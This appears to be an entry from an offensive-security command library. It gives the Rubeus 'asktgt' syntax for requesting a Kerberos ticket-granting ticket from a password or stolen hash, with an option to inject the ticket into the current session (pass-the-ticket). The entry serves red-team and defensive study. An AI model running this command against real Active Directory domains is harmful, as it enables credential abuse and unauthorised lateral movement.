---
id: d2fe4821-f038-4b59-a10a-ab37f52ddb01
name: Ask TGT Ticket
type: command
executor: bash
data: Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256]
  | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
  [/ptt] [/luid]
output: null
created_at: '2023-04-06T03:56:01.852866+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Ask TGT Ticket

```bash
Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
```


